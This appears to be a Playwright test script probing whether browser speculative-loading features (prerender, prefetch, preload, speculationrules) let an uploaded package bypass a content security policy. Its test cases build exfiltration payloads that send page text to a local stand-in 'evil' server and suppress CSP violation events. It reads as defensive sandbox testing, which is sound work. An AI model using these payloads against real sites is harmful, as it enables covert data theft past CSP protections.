// EXP15: which speculative-loading mechanisms let a package make an HTTP request despite the CSP?
// Runs in the normal prepared document (no self-navigation), full Chromium, hosted player.
const fs = require('node:fs'); const path = require('node:path'); const http = require('node:http');
const { chromium } = require('playwright'); const L = require('./lib.cjs');
const EVIL = 'http://localhost:4401';
const page1 = (body, script) => `<!doctype html><html lang="en"><head></head><body><h1>speculative loading probe</h1>${body}<script>${script}</script></body></html>`;
const mute = `window.addEventListener('securitypolicyviolation',e=>{(window.__v=window.__v||[]).push(e.effectiveDirective+' <- '+e.blockedURI);e.stopImmediatePropagation()},true);`;
const link = (rel, extra = '') => `{const l=document.createElement('link');l.rel='${rel}';${extra}l.href='${EVIL}/${rel}?leak=SECRET-'+encodeURIComponent(document.querySelector('h1').textContent);document.head.append(l);}`;
const cases = {
  'link-prerender (dynamic)': page1('', mute + link('prerender')),
  'link-prefetch (dynamic)': page1('', mute + link('prefetch')),
  'link-preload-as-image (dynamic)': page1('', mute + link('preload', "l.as='image';")),
  'link-preconnect (dynamic)': page1('', mute + link('preconnect')),
  'link-dns-prefetch (dynamic)': page1('', mute + link('dns-prefetch')),
  'speculationrules prefetch+prerender (dynamic script with copied nonce)': page1('', mute + `{const s=document.createElement('script');s.type='speculationrules';s.nonce=document.currentScript.nonce;s.textContent=JSON.stringify({prefetch:[{source:'list',urls:['${EVIL}/specrules-prefetch?leak=SECRET'],eagerness:'immediate'}],prerender:[{source:'list',urls:['${EVIL}/specrules-prerender?leak=SECRET'],eagerness:'immediate'}]});document.head.append(s);}`),
  'speculationrules (static in package HTML)': page1(`<script type="speculationrules">{"prefetch":[{"source":"list","urls":["${EVIL}/static-specrules-prefetch?leak=SECRET"],"eagerness":"immediate"}],"prerender":[{"source":"list","urls":["${EVIL}/static-specrules-prerender?leak=SECRET"],"eagerness":"immediate"}]}</script>`, mute),
  'link-prerender (static in package HTML; the preparer removes <link>)': page1(`<link rel="prerender" href="${EVIL}/static-link-prerender?leak=SECRET">`, mute),
};
(async () => {
  const site = await L.startSite(4400);
  const log = [];
  const evil = http.createServer((req, res) => { log.push({ url: req.url, purpose: req.headers['sec-purpose'] || req.headers.purpose || null, dest: req.headers['sec-fetch-dest'] || null, site: req.headers['sec-fetch-site'] || null, referer: req.headers.referer || null, origin: req.headers.origin || null, cookie: req.headers.cookie || null }); res.writeHead(200, { 'content-type': 'text/html' }); res.end('<p>attacker page</p>'); });
  await new Promise((r) => evil.listen(4401, '0.0.0.0', r));
  const out = {};
  try {
    for (const channel of ['chromium']) {
      const browser = await chromium.launch({ channel });
      for (const [name, html] of Object.entries(cases)) {
        const page = await (await browser.newContext()).newPage();
        await L.openWorkspace(page, 'http://127.0.0.1:4400/');
        await L.openFile(page, L.makePackage(html), 'spec.zip');
        await page.locator('[data-pres-start-button]').waitFor({ state: 'visible', timeout: 15000 });
        const before = log.length;
        await page.locator('[data-pres-start-button]').click();
        await L.sleep(3500);
        const frame = L.appFrame(page); const s = await L.dialogState(page);
        out[name] = { hostStatus: s.status, notice: s.notice, violations: frame ? await frame.evaluate(() => window.__v || []).catch(() => null) : null, attackerReceived: log.slice(before) };
        console.log(`\n${name}\n   host: ${s.status}${s.notice ? ' | ' + s.notice : ''}\n   violations: ${JSON.stringify(out[name].violations)}\n   ATTACKER RECEIVED: ${JSON.stringify(out[name].attackerReceived)}`);
        await page.close();
      }
      await browser.close();
    }
  } finally { await site.close(); evil.closeAllConnections?.(); await new Promise((r) => evil.close(r)); fs.writeFileSync(path.join(__dirname, 'logs', 'exp15-prerender.json'), JSON.stringify(out, null, 2)); }
})().catch((e) => { console.error(e); process.exit(1); });
